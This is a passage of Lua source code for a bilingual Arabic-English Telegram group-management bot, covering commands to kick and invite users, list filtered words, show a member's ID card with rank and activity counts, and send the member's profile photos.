text = '🚦⁞ معـرفه ~ « @'..ap[2]..' »\n🖇⁞ ايـديـه ~ « `'..result.id_..'` »\n💳⁞ رتـبتـه ~ « '..t
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ Channel ~ « @'..ap[2]..' »\n🖇⁞ id ~ « {`'..result.id_..'`}'
else
text = '🚦⁞ القناة ~ « @'..ap[2]..' »\n🖇⁞ ايديها ~ « {`'..result.id_..'`}'
end
end
end
if not result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ Username is not correct ☑️'
else
text = '🚦⁞ المعرف غير صحيح ☑️'
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
-----------------------------------------------bot------------------------------------------------
local text = msg.content_.text_:gsub('طرد','Kick')
if text:match("^[Kk]ick$") and msg.reply_to_message_id_ ~= 0 then
function kick_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and botx1:get("bot:lock:ban"..bot_id..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع الحظر او الطرد •\n🌿⁞ لانه معطل من قبل المنشئ •', 1, 'md')
return "bot"
end
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
if not is_momod(result.sender_user_id_, result.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The user ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been kicked ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم  « طرده » بنجاح *', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--------------------------bot-------------------------------
if text:match("^[Kk]ick @(.*)$") then
local ap = {string.match(text, "^([Kk]ick) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and botx1:get("bot:lock:ban"..bot_id..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع الحظر او الطرد •\n🌿⁞ لانه معطل من قبل المنشئ •', 1, 'md')
return "bot"
end
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if not is_momod(result.id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been kicked ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم  « طرده » بنجاح'
end
chat_kick(msg.chat_id_, result.id_)
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
text = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],ban_by_username)
end
------------------------------bot-----------------------------------------------------------------
if text:match("^[Kk]ick (%d+)$") then
local ap = {string.match(text, "^([Kk]ick) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and botx1:get("bot:lock:ban"..bot_id..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع الحظر او الطرد •\n🌿⁞ لانه معطل من قبل المنشئ •', 1, 'md')
return "bot"
end
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if not is_momod(ap[2], msg.chat_id_) then
chat_kick(msg.chat_id_, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The user ؛ '..ap[2]..' ، 🚷\n🎈|| has been kicked ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم  « طرده » بنجاح *', 1, 'md')
end end end end
-----------------------------------bot-----------------------------------------------------------
      if text:match("^[Ff]ilterlist$") or text:match("^قائمه المنع$") then
            local hash = (BOT..'bot:filters:'..msg.chat_id_)
            if hash then
              local names = botx1:hkeys(hash)
              if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
                text = "🚦⁞ Filterlist 🔽 : \n\n"
              else
                text = "🚦⁞ قائمه الكلمات الممنوعه 🔽 : \n\n"
              end
              for i=1, #names do
                text = text..'~ ⁞ '..names[i]..'\n'
              end
              if #names == 0 then
                if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
                  text = "🚦⁞ Filterlist is empty ☑️"
                else
                  text = "🚦⁞ لا يوجد كلمات ممنوعه ☑️"
                end
              end
              botdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
            end
          end
----------------------------------bot-------------------------------------------------------------
if text:match("^[Ff]ilterall list$") or text:match("^قائمه المنع العام$") then
local hash = (BOT..'bot:freewords:')
if hash then
local names = botx1:hkeys(hash) 
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ Filter all list 🔽 : \n\n'
else
text = '🚦⁞ قائمه المنع العام 🔽 : \n\n'
end
for i=1, #names do
text = text..' ~ ⁞ '..names[i]..'\n'
end
if #names == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ Filter all list is empty ☑️"
else
text = "🚦⁞ لا يوجد كلمات ممنوعه عام ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
----------------------------------------bot-------------------------------------------------------
local text = msg.content_.text_:gsub('اضافه','Invite')
if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
function inv_reply(extra, result, success)
add_user(result.chat_id_, result.sender_user_id_, 5)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
end
-----------------------------------bot------------------------------------------------------------
if text:match("^[Ii]nvite @(.*)$") then
local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
function invite_by_username(extra, result, success)
if result.id_ then
add_user(msg.chat_id_, result.id_, 5)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '🚦|User not found '
else
texts = '🚦|| المعرف غير صحيح •'
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
end
resolve_username(ap[2],invite_by_username)
end
end
--------------------------------------bot---------------------------------------------------------
if text:match("^[Ii]nvite (%d+)$") then
local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
add_user(msg.chat_id_, ap[2], 5)
end
-------- 
if text:match("^تعيين الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ اتبع التعليمات ليتم تعيين الكليشه الجديده •\n🌿⁞ ارسل كليشه تحتوي على النصوص التي باللغه الانكليزيه ادناه •\n\n• username ~ معرف العضو\n• photo ~ عدد صور العضو \n• nkat ~ عدد نقاط العضو \n• cont ~ عدد اضافات العضو\n• sticker ~ عدد ملصقات العضو\n• msgs ~ عدد رسائل العضو\n• id ~ ايدي العضو \n• formsg ~ تفاعل العضو \n• renk ~ رتبه العضو ', 1, 'md')
botx1:set("BOT:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'bot')
return "bot"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_)  and botx1:get("BOT:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
botx1:del("BOT:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفض الكليشه الجديده • ', 1, 'md')
botx1:set("BOT:bot:id:text:"..bot_id..msg.chat_id_,text)
end
if text:match("^مسح الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم مسح كليشه الايدي • ', 1, 'md')
botx1:del("BOT:bot:id:text:"..bot_id..msg.chat_id_)
end
---------------------------------bot--------------------------------------------------------------  
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if (text:match("^ايدي$") or text:match("^[Ii]Dd$")) and bot11(msg) then
function bot(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = ' لا يوجد 🎍 ' end
local function getpro(extra, result, success) 
local bot = botx1:get(BOT..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local boty = (botx1:get('bot:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = botx1:get(BOT..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(botx1:get(BOT.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(botx1:get(BOT..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(botx1:get(BOT..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(botx1:get(BOT..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
if result.photos_[0] then
if is_sudo(msg) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not botx1:get('BOT:id:mute'..msg.chat_id_) then 
if not botx1:get('BOT:id:photo'..msg.chat_id_) then 
if not botx1:get("BOT:bot:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"\n🎫╿ معرفك ⇜ { "..username.." }\n🖼┊صورك ⇜ { "..result.total_count_.." }\n🎲┊نقاطك ⇜ { "..user_nkt.." }\n📊┊جهاتك ⇜ { "..cont.." }\n🎑┊ملصقاتك ⇜ { "..sticker.." }\n💌┊رسائلك ⇜ { "..(user_msgs + boty).." / "..(bot).."}\n🎟┊ايديك ⇜ { "..msg.sender_user_id_.." }\n🌟┊تفاعلك ⇜ { "..formsgg(msguser).." }\n📌╽موقعك ⇜ { "..t.." }\n——————————————————\n",msg.id_,msg.id_.."")
else 
local new_id = botx1:get("BOT:bot:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photo',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('renk',(t or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if is_sudo(msg) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not botx1:get("BOT:bot:id:text:"..bot_id..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, "🎫╿ معرفك ⇜ { "..username.." }\n🖼┊صورك ⇜ { "..result.total_count_.." }\n🎲┊نقاطك ⇜ { "..user_nkt.." }\n📊┊جهاتك ⇜ { "..cont.." }\n🎑┊ملصقاتك ⇜ { "..sticker.." }\n💌┊رسائلك ⇜ { "..user_msgs.." }\n🎟┊ايديك ⇜ { "..msg.sender_user_id_.." }\n🌟┊تفاعلك ⇜ { "..formsgg(msguser).." }\n📌╽موقعك ⇜ { "..t.." }\n——————————————————\n", 1, 'html')
else
local new_id = botx1:get("BOT:bot:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('username',(username or 'لا يوجد'))
local new_id = new_id:gsub('photo',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('nkat',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('renk',(t or 'لا يوجد'))
botdx(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ID disabled • ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ الايدي معطل • ', 1, 'md')
end
end
else
if is_sudo(msg) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if not botx1:get('BOT:id:mute'..msg.chat_id_) then
if not botx1:get('BOT:id:photo'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "◗≡¹⁞ You not have any photo \n◗≡²⁞ User name ‹› "..username.."\n◗≡³⁞ Point ‹› "..user_nkt.."\n◗≡⁴⁞ Contacts ‹› "..cont.."\n◗≡°⁞ Sticker ‹› "..sticker.."\n◗≡⁴⁞ Msg ‹› "..user_msgs.."\n◗≡³⁞ ID ‹› "..msg.sender_user_id_.."\n◗≡²⁞ interaction ‹› "..formsgg(msguser).."\n◗≡¹⁞ Renk ‹› "..t.."\n", 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, "🖼╿لا استطيع عرض صورتك بسبب ⏬\n📕┊انك دخلت للبوت ثم حظرته\n📸┊او انك لا تمتلك صوره شخصيه\n\n🎫┊ معرفك ⇜ { "..username.." }\n🎲┊نقاطك ⇜ { "..user_nkt.." }\n📊┊جهاتك ⇜ { "..cont.." }\n🎑┊ملصقاتك ⇜ { "..sticker.." }\n💌┊رسائلك ⇜ { "..user_msgs.." }\n🎟┊ايديك ⇜ { "..msg.sender_user_id_.." }\n🌟┊تفاعلك ⇜ { "..formsgg(msguser).." }\n📌╽موقعك ⇜ { "..t.." }\n——————————————————\n", 1, 'html')
end
else
if is_sudo(msg) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else
t = ' مطور اساسي'
end
elseif is_admin(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(msg.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "◗≡¹⁞ User name ‹› "..username.."\n◗≡²⁞ Photo ‹› "..result.total_count_.."\n◗≡³⁞ Point ‹› "..user_nkt.."\n◗≡⁴⁞ Contacts ‹› "..cont.."\n◗≡°⁞ Sticker ‹› "..sticker.."\n◗≡⁴⁞ Msg ‹› "..user_msgs.."\n◗≡³⁞ ID ‹› "..msg.sender_user_id_.."\n◗≡²⁞ interaction ‹› "..formsgg(msguser).."\n◗≡¹⁞ Renk ‹› "..t.."\n", 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, "🎫╿ معرفك ⇜ { "..username.." }\n🖼┊صورك ⇜ { "..result.total_count_.." }\n🎲┊نقاطك ⇜ { "..user_nkt.." }\n📊┊جهاتك ⇜ { "..cont.." }\n🎑┊ملصقاتك ⇜ { "..sticker.." }\n💌┊رسائلك ⇜ { "..user_msgs.." }\n🎟┊ايديك ⇜ { "..msg.sender_user_id_.." }\n🌟┊تفاعلك ⇜ { "..formsgg(msguser).." }\n📌╽موقعك ⇜ { "..t.." }\n——————————————————\n", 1, 'html')
end
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ID disabled • ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ الايدي معطل • ', 1, 'md')
end end end end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getpro, nil)
end
getUser(msg.sender_user_id_, bot)
end
end
------------------------------------------bot----------------------------------------------------
if text == "صورتي" and not botx1:get(BOT.."lock:get:photo"..msg.chat_id_)  then 
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"🚦⁞ لديك "..result.total_count_.." صوره‌‏ •", msg.id_, msg.id_, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ لا تمتلك صوره في حسابك  •", 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end 
if text:match("^صورتي (%d+)$") then
local pronumb = {string.match(text, "^(صورتي) (%d+)$")}
local function gproen(extra, result, success)
if not is_momod(msg.sender_user_id_, msg.chat_id_) and botx1:get(BOT.."lock:get:photo"..msg.chat_id_)  then 
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ Get profile photo is deactive •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '️🚏 ⁞ جلب الصوره الشخصيه معطل  ✅', 1, 'md')
end
else
if pronumb[2] == '1' then
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك صوره شخصيه ❎", 1, 'md')
end
end
elseif pronumb[2] == '2' then
if result.photos_[1] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 2 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '3' then
if result.photos_[2] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 3 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '4' then
if result.photos_[3] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 4 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '5' then
if result.photos_[4] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't 5 have profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '6' then
if result.photos_[5] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 6 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '7' then
if result.photos_[6] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 7 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '8' then
if result.photos_[7] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 8 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '9' then
if result.photos_[8] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 9 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
elseif pronumb[2] == '10' then
if result.photos_[9] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 10 profile photo •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
end
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ I just can get last 10 profile photos •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞لا يمكنني ان ارسل لك اكثر من 10 صور ❎", 1, 'md')
end
end
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = pronumb[2]
}, gproen, nil)
end
